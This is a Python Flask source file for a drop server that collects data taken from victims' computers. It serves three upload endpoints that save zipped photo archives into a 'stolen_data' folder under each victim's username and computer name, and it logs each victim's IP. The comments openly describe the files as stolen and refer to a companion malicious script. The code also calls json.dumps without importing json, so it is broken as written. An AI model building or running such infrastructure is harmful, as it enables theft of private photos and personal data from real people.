from flask import Flask, request, jsonify
import os
import uuid
from datetime import datetime

app = Flask(__name__)

# Directory to store stolen data
UPLOAD_FOLDER = './stolen_data'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

@app.route('/photos', methods=['POST'])
def receive_photos():
    try:
        # Extract metadata from form data
        username = request.form.get('username', 'unknown')
        computername = request.form.get('computername', 'unknown')
        photos_count = request.form.get('photos_count', 0)
        
        # Save uploaded file
        if 'file' in request.files:
            file = request.files['file']
            if file.filename:
                # Create unique filename with metadata
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"{username}_{computername}_{timestamp}_{uuid.uuid4().hex[:8]}.zip"
                file_path = os.path.join(UPLOAD_FOLDER, filename)
                file.save(file_path)
                
                # Log the theft
                log_entry = {
                    'timestamp': datetime.now().isoformat(),
                    'username': username,
                    'computername': computername,
                    'photos_count': photos_count,
                    'file_saved': filename,
                    'size_bytes': os.path.getsize(file_path) if os.path.exists(file_path) else 0,
                    'client_ip': request.remote_addr
                }
                
                # Append to log file
                with open('./stolen_data/log.jsonl', 'a') as log_file:
                    log_file.write(json.dumps(log_entry) + '\n')
                
                print(f"[+] Received data from {username}@{computername} - {photos_count} photos")
                return jsonify({'status': 'success'}), 200
                
    except Exception as e:
        print(f"[-] Error: {e}")
    
    return jsonify({'status': 'error'}), 400

@app.route('/receive', methods=['POST'])
def receive_backup():
    """Alternative endpoint (as in the malicious script)"""
    return receive_photos()

@app.route('/log', methods=['POST'])
def receive_log():
    """Another backup endpoint"""
    return receive_photos()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80, debug=True)